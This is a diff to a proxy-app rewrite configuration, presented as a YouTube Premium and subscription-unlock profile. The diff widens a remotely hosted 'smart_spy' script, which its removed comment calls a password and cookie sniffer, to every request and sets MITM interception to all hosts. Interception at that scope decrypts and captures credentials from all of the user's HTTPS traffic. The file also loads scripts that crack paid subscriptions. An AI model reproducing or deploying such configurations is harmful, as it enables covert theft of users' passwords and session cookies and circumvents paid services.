@@ -22,9 +22,8 @@ http-request ^https:\/\/(spclient\.wg\.spotify\.com|.*-spclient\.spotify\.com(:4
 
 [Script]
 
-# === LAB: SMART SNIFFER (PASSWORD & COOKIE) ===
-# Bắt toàn bộ HTTP/HTTPS traffic
-smart_spy = type=http-request,pattern=^http,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/smart_spy.js,requires-body=true
+# Sửa pattern thành .* để bắt dính mọi request
+smart_spy = type=http-request,pattern=.*,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/smart_spy.js,requires-body=true
 
 # === YouTube Premium ===
 youtube.request = type=http-request,pattern=^https:\/\/youtubei\.googleapis\.com\/youtubei\/v1\/(browse|next|player|reel\/reel_watch_sequence|get_watch),requires-body=1,max-size=-1,binary-body-mode=1,engine=jsc,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/youtube.response.js
@@ -55,8 +54,7 @@ deleteHeader = type=http-request,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(r
 
 [MITM]
 enable = true
-# Danh sách tổng hợp tất cả các API nghi vấn từ Log
-hostname = hit.club, *.hit.club, *.wsmt8g.cc, *.trakipsg.net, *.genesockezlyfeapy.com, *.dsrcgoms.net, *.geightdors.net, *.hytsocesk.com, *.8xdfd3t6f.com, *.facebook.com, *.google.com, *.youtube.com
+hostname = *
 
 
 
